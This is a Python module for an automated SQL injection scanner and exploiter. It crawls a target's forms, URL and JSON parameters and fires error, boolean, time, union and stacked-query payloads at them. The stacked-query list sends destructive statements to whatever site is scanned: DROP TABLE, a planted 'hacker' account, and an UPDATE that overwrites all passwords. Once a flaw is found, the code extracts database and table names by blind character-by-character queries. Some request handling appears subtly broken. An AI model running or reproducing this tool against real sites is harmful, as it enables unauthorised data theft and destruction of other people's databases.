import asyncio
import aiohttp
import time
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
from colorama import init, Fore, Style
from utils.log import Log

init(autoreset=True)

class SQL:
    def __init__(self, target, logger: Log):
        self.target = target
        self.logger = logger
        self.session = None
        self.vulnerabilities = []
        self.forms = []
        self.params = []
        self.timeout = aiohttp.ClientTimeout(total=30)
        self.connector = None
        
        self.sql_errors = [
            r"SQL syntax",
            r"mysql_fetch",
            r"ORA-\d+",
            r"PostgreSQL",
            r"SQLite",
            r"Unclosed quotation mark",
            r"Microsoft OLE DB",
            r"You have an error in your SQL syntax",
            r"Warning: mysql",
            r"Warning: mysqli",
            r"DB Error",
            r"Invalid query",
            r"MySQLSyntaxErrorException",
            r"java\.sql\.SQLException",
            r"org\.postgresql",
            r"org\.sqlite",
            r"Microsoft\.Jet\.OLEDB",
            r"SQL Server",
            r"incorrect syntax near"
        ]
        
        self.payloads = {
            'error_based': [
                "'", "\"", "')", "\")", "1'", "1\"",
                "' OR '1'='1", "\" OR \"1\"=\"1",
                "' OR 1=1--", "\" OR 1=1--",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1' AND '1'='1", "1' AND '1'='2",
                "' OR SLEEP(5)--", "\" OR SLEEP(5)--",
                "' AND SLEEP(5)--", "' OR pg_sleep(5)--",
                "' WAITFOR DELAY '0:0:5'--",
            ],
            'boolean_based': [
                ("' AND '1'='1", "' AND '1'='2"),
                ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
                ("' AND 1=1--", "' AND 1=2--"),
                ("\" AND 1=1--", "\" AND 1=2--"),
                ("' OR 1=1--", "' OR 1=2--"),
                ("\" OR 1=1--", "\" OR 1=2--"),
            ],
            'union_based': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION SELECT database(),NULL--",
                "' UNION SELECT user(),NULL--",
                "' UNION SELECT version(),NULL--",
                "' UNION SELECT @@version,NULL--",
            ],
            'time_based': [
                ("' AND SLEEP(5)--", 5),
                ("' OR SLEEP(5)--", 5),
                ("\" AND SLEEP(5)--", 5),
                ("' AND pg_sleep(5)--", 5),
                ("' WAITFOR DELAY '0:0:5'--", 5),
                ("' AND BENCHMARK(5000000,MD5('test'))--", 3),
            ],
            'stacked_queries': [
                "'; DROP TABLE users--",
                "'; INSERT INTO users VALUES('hacker','password')--",
                "'; UPDATE users SET password='hacked'--",
                "'; DELETE FROM users WHERE id=1--",
            ]
        }

    async def run(self):
        self.logger.info(f"Starting SQL injection scan on: {self.target}")
        
        self.connector = aiohttp.TCPConnector(limit=10, ttl_dns_cache=300)
        
        async with aiohttp.ClientSession(
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout=self.timeout,
            connector=self.connector
        ) as session:
            self.session = session
            await self.discover_forms()
            self.extract_parameters()
            
            if not self.params:
                self.logger.warning("No parameters found to test")
                return self.vulnerabilities
            
            tasks = []
            for param in self.params:
                tasks.append(self.test_parameter(param))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for param, result in zip(self.params, results):
                if isinstance(result, Exception):
                    self.logger.debug(f"Error testing {param['name']}: {str(result)}")
                    continue
                if result:
                    self.logger.success(f"SQL Injection found in parameter: {param['name']}")
                    await self.exploit_parameter(param)
        
        self.generate_report()
        return self.vulnerabilities

    async def discover_forms(self):
        try:
            async with self.session.get(self.target, ssl=False) as response:
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')
                
                forms = soup.find_all('form')
                for form in forms:
                    form_data = {
                        'action': form.get('action', ''),
                        'method': form.get('method', 'GET').upper(),
                        'inputs': []
                    }
                    
                    for input_tag in form.find_all('input'):
                        input_data = {
                            'name': input_tag.get('name', ''),
                            'type': input_tag.get('type', 'text'),
                            'value': input_tag.get('value', '')
                        }
                        if input_data['name']:
                            form_data['inputs'].append(input_data)
                    
                    for textarea in form.find_all('textarea'):
                        input_data = {
                            'name': textarea.get('name', ''),
                            'type': 'textarea',
                            'value': textarea.text or ''
                        }
                        if input_data['name']:
                            form_data['inputs'].append(input_data)
                    
                    for select in form.find_all('select'):
                        selected = select.find('option', selected=True) or select.find('option')
                        input_data = {
                            'name': select.get('name', ''),
                            'type': 'select',
                            'value': selected.get('value', '') if selected else ''
                        }
                        if input_data['name'] and input_data['value']:
                            form_data['inputs'].append(input_data)
                    
                    if form_data['inputs']:
                        self.forms.append(form_data)
                        self.logger.debug(f"Found form: {form_data['method']} to {form_data['action']}")
                
                parsed = urlparse(self.target)
                if parsed.query:
                    params = parse_qs(parsed.query)
                    for param_name, param_value in params.items():
                        self.params.append({
                            'name': param_name,
                            'location': 'url',
                            'value': param_value[0] if param_value else '',
                            'method': 'GET'
                        })
                
                if 'application/json' in response.headers.get('Content-Type', ''):
                    self.logger.debug("JSON API detected")
                    try:
                        json_data = await response.json()
                        self.extract_json_params(json_data)
                    except:
                        pass
                        
        except Exception as e:
            self.logger.error(f"Error discovering forms: {str(e)}")

    def extract_parameters(self):
        for form in self.forms:
            for input_data in form['inputs']:
                if input_data['name']:
                    param = {
                        'name': input_data['name'],
                        'location': 'form',
                        'value': input_data['value'],
                        'method': form['method'],
                        'action': form['action'],
                        'type': input_data['type']
                    }
                    if not any(p['name'] == param['name'] and p['method'] == param['method'] for p in self.params):
                        self.params.append(param)

    def extract_json_params(self, json_data, prefix=''):
        if isinstance(json_data, dict):
            for key, value in json_data.items():
                param_name = f"{prefix}{key}" if prefix else key
                self.params.append({
                    'name': param_name,
                    'location': 'json',
                    'value': str(value) if value else '',
                    'method': 'POST',
                    'json_path': key
                })
                if isinstance(value, (dict, list)):
                    self.extract_json_params(value, f"{param_name}.")
        elif isinstance(json_data, list):
            for i, item in enumerate(json_data):
                if isinstance(item, (dict, list)):
                    self.extract_json_params(item, f"{prefix}[{i}]")

    async def test_parameter(self, param):
        try:
            results = []
            
            if await self.test_error_based(param):
                results.append('error_based')
            
            if await self.test_boolean_based(param):
                results.append('boolean_based')
            
            if await self.test_time_based(param):
                results.append('time_based')
            
            if await self.test_union_based(param):
                results.append('union_based')
            
            if await self.test_stacked_queries(param):
                results.append('stacked_queries')
            
            if results:
                param['vulnerable'] = True
                param['techniques'] = results
                self.vulnerabilities.append(param)
                return True
            
            return False
        except Exception as e:
            self.logger.debug(f"Error testing {param['name']}: {str(e)}")
            return False

    async def test_error_based(self, param):
        original_value = param['value']
        
        for payload in self.payloads['error_based']:
            try:
                test_value = original_value + payload if original_value else payload
                
                response = await self.send_request(param, test_value)
                
                if response and response.status == 200:
                    text = await response.text()
                    for error_pattern in self.sql_errors:
                        if re.search(error_pattern, text, re.IGNORECASE):
                            self.logger.debug(f"Error-based SQL injection found with payload: {payload}")
                            return True
                    
                    if 'database' in text.lower() or 'table' in text.lower():
                        return True
            except:
                continue
        
        return False

    async def test_boolean_based(self, param):
        original_value = param['value']
        
        try:
            baseline_response = await self.send_request(param, original_value)
            if not baseline_response:
                return False
            
            baseline_text = await baseline_response.text()
        except:
            return False
        
        for true_payload, false_payload in self.payloads['boolean_based']:
            try:
                test_true = original_value + true_payload if original_value else true_payload
                test_false = original_value + false_payload if original_value else false_payload
                
                response_true = await self.send_request(param, test_true)
                response_false = await self.send_request(param, test_false)
                
                if response_true and response_false:
                    text_true = await response_true.text()
                    text_false = await response_false.text()
                    
                    diff_ratio = self.compare_responses(text_true, text_false)
                    
                    if diff_ratio > 0.1:
                        self.logger.debug(f"Boolean-based SQL injection found")
                        return True
            except:
                continue
        
        return False

    async def test_time_based(self, param):
        original_value = param['value']
        
        try:
            baseline_start = time.time()
            await self.send_request(param, original_value)
            baseline_time = time.time() - baseline_start
        except:
            baseline_time = 1.0
        
        for payload, delay in self.payloads['time_based']:
            try:
                test_value = original_value + payload if original_value else payload
                
                start = time.time()
                await self.send_request(param, test_value)
                elapsed = time.time() - start
                
                if elapsed >= delay and elapsed > baseline_time * 2:
                    self.logger.debug(f"Time-based SQL injection found with payload: {payload}")
                    return True
            except:
                continue
        
        return False

    async def test_union_based(self, param):
        original_value = param['value']
        
        for payload in self.payloads['union_based']:
            try:
                test_value = original_value + payload if original_value else payload
                
                response = await self.send_request(param, test_value)
                
                if response and response.status == 200:
                    text = await response.text()
                    if any(keyword in text.lower() for keyword in ['database', 'table', 'column', 'user', 'password']):
                        self.logger.debug(f"Union-based SQL injection found with payload: {payload}")
                        return True
            except:
                continue
        
        return False

    async def test_stacked_queries(self, param):
        original_value = param['value']
        
        for payload in self.payloads['stacked_queries']:
            try:
                test_value = original_value + payload if original_value else payload
                
                response = await self.send_request(param, test_value)
                
                if response and response.status == 200:
                    text = await response.text()
                    for error in ['duplicate', 'primary key', 'constraint']:
                        if error in text.lower():
                            self.logger.debug(f"Stacked query injection found with payload: {payload}")
                            return True
            except:
                continue
        
        return False

    async def exploit_parameter(self, param):
        if 'error_based' in param['techniques']:
            await self.exploit_error_based(param)
        elif 'union_based' in param['techniques']:
            await self.exploit_union_based(param)
        elif 'boolean_based' in param['techniques']:
            await self.exploit_boolean_based(param)
        elif 'time_based' in param['techniques']:
            await self.exploit_time_based(param)

    async def exploit_error_based(self, param):
        self.logger.info("Exploiting error-based SQL injection")
        
        payloads = [
            "1' AND extractvalue(1, concat(0x7e, database()))--",
            "1' AND updatexml(1, concat(0x7e, database()), 1)--",
            "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(database(), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
        
        for payload in payloads:
            try:
                response = await self.send_request(param, payload)
                if response and response.status == 200:
                    text = await response.text()
                    match = re.search(r'~([^~]+)~', text)
                    if match:
                        param['database'] = match.group(1)
                        self.logger.success(f"Database: {param['database']}")
                        break
                    
                    match = re.search(r'Duplicate entry \'(.+?)\'', text)
                    if match:
                        param['database'] = match.group(1)
                        self.logger.success(f"Database: {param['database']}")
                        break
            except:
                continue

    async def exploit_union_based(self, param):
        self.logger.info("Exploiting union-based SQL injection")
        
        columns = await self.find_columns(param)
        if columns:
            param['columns'] = columns
            self.logger.success(f"Found {columns} columns")
            
            try:
                payload = f"1' UNION SELECT database(),{','.join(['NULL']*(columns-1))}--"
                response = await self.send_request(param, payload)
                
                if response and response.status == 200:
                    text = await response.text()
                    match = re.search(r'([a-zA-Z0-9_]+)\s*$', text.strip())
                    if match:
                        param['database'] = match.group(1)
                        self.logger.success(f"Database: {param['database']}")
            except:
                pass
            
            try:
                tables_payload = f"1' UNION SELECT table_name,{','.join(['NULL']*(columns-1))} FROM information_schema.tables WHERE table_schema=database()--"
                response = await self.send_request(param, tables_payload)
                
                if response and response.status == 200:
                    text = await response.text()
                    tables = re.findall(r'([a-zA-Z0-9_]+)', text)
                    if tables:
                        param['tables'] = tables
                        self.logger.success(f"Tables: {', '.join(tables[:5])}...")
            except:
                pass

    async def exploit_boolean_based(self, param):
        self.logger.info("Exploiting boolean-based blind SQL injection")
        
        db_name = await self.extract_boolean_data(param, "database()")
        if db_name:
            param['database'] = db_name
            self.logger.success(f"Database: {db_name}")
        
        table_names = []
        for table_index in range(10):
            table_name = await self.extract_boolean_data(param, f"(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {table_index},1)")
            if table_name:
                table_names.append(table_name)
            else:
                break
        
        if table_names:
            param['tables'] = table_names
            self.logger.success(f"Found {len(table_names)} tables")

    async def exploit_time_based(self, param):
        self.logger.info("Exploiting time-based blind SQL injection")
        
        db_name = await self.extract_time_data(param, "database()")
        if db_name:
            param['database'] = db_name
            self.logger.success(f"Database: {db_name}")

    async def extract_boolean_data(self, param, sql_query, max_length=50):
        result = ""
        original_value = param['value']
        
        for pos in range(1, max_length + 1):
            found = False
            for char in "abcdefghijklmnopqrstuvwxyz0123456789_-":
                try:
                    payload = f"1' AND ASCII(SUBSTRING(({sql_query}),{pos},1))={ord(char)}--"
                    test_value = original_value + payload if original_value else payload
                    
                    response_true = await self.send_request(param, test_value)
                    payload_false = f"1' AND ASCII(SUBSTRING(({sql_query}),{pos},1))!={ord(char)}--"
                    test_false = original_value + payload_false if original_value else payload_false
                    response_false = await self.send_request(param, test_false)
                    
                    if response_true and response_false:
                        text_true = await response_true.text()
                        text_false = await response_false.text()
                        diff = self.compare_responses(text_true, text_false)
                        if diff > 0.1:
                            result += char
                            self.logger.debug(f"Extracted character: {char}")
                            found = True
                            break
                except:
                    continue
            
            if not found:
                break
        
        return result if result else None

    async def extract_time_data(self, param, sql_query, max_length=50):
        result = ""
        original_value = param['value']
        
        for pos in range(1, max_length + 1):
            found = False
            for char in "abcdefghijklmnopqrstuvwxyz0123456789_-":
                try:
                    payload = f"1' AND IF(ASCII(SUBSTRING(({sql_query}),{pos},1))={ord(char)}, SLEEP(5), 0)--"
                    test_value = original_value + payload if original_value else payload
                    
                    start = time.time()
                    await self.send_request(param, test_value)
                    elapsed = time.time() - start
                    
                    if elapsed >= 4:
                        result += char
                        self.logger.debug(f"Extracted character: {char}")
                        found = True
                        break
                except:
                    continue
            
            if not found:
                break
        
        return result if result else None

    async def find_columns(self, param):
        original_value = param['value']
        
        for i in range(1, 20):
            try:
                nulls = ','.join(['NULL'] * i)
                payload = f"1' UNION SELECT {nulls}--"
                test_value = original_value + payload if original_value else payload
                
                response = await self.send_request(param, test_value)
                if response and response.status == 200:
                    text = await response.text()
                    if 'error' not in text.lower():
                        return i
            except:
                continue
        
        return None

    async def send_request(self, param, value):
        try:
            if param.get('location') == 'url':
                parsed = urlparse(self.target)
                query_params = parse_qs(parsed.query)
                query_params[param['name']] = [value]
                new_query = urlencode(query_params, doseq=True)
                new_url = urljoin(self.target, parsed.path + '?' + new_query)
                async with self.session.get(new_url, ssl=False) as response:
                    return response
            
            elif param.get('location') == 'form':
                url = urljoin(self.target, param['action']) if param['action'] else self.target
                
                form_data = {}
                for p in self.params:
                    if p['name'] == param['name']:
                        form_data[p['name']] = value
                    else:
                        form_data[p['name']] = p.get('value', '')
                
                if param['method'] == 'POST':
                    async with self.session.post(url, data=form_data, ssl=False) as response:
                        return response
                else:
                    async with self.session.get(url, params=form_data, ssl=False) as response:
                        return response
            
            elif param.get('location') == 'json':
                json_data = {param['name']: value}
                async with self.session.post(self.target, json=json_data, ssl=False) as response:
                    return response
            
            else:
                async with self.session.get(self.target, params={param['name']: value}, ssl=False) as response:
                    return response
                
        except asyncio.TimeoutError:
            self.logger.debug(f"Timeout for parameter: {param['name']}")
            return None
        except Exception as e:
            self.logger.debug(f"Error: {str(e)}")
            return None

    def compare_responses(self, text1, text2):
        if not text1 or not text2:
            return 0
        
        len_diff = abs(len(text1) - len(text2))
        len_ratio = len_diff / max(len(text1), len(text2), 1)
        
        structure1 = re.sub(r'<[^>]+>', '', text1)[:1000]
        structure2 = re.sub(r'<[^>]+>', '', text2)[:1000]
        
        char_diff = sum(1 for a, b in zip(structure1, structure2) if a != b)
        char_ratio = char_diff / max(len(structure1), len(structure2), 1)
        
        return max(len_ratio, char_ratio)

    def generate_report(self):
        if not self.vulnerabilities:
            self.logger.info("No SQL injection vulnerabilities found")
            return
        
        self.logger.success(f"Found {len(self.vulnerabilities)} SQL injection vulnerabilities")
        
        for vuln in self.vulnerabilities:
            print("\n" + "=" * 50)
            self.logger.info(f"Vulnerability in parameter: {vuln['name']}")
            print(f"  Location: {vuln.get('location', 'unknown')}")
            print(f"  Method: {vuln.get('method', 'GET')}")
            print(f"  Techniques: {', '.join(vuln.get('techniques', []))}")
            
            if vuln.get('database'):
                print(f"  Database: {vuln['database']}")
            
            if vuln.get('tables'):
                print(f"  Tables: {', '.join(vuln['tables'][:10])}")
                if len(vuln['tables']) > 10:
                    print(f"  ... and {len(vuln['tables']) - 10} more")
            
            print(f"  Recommendation: Use parameterized queries and input validation")
            print("=" * 50)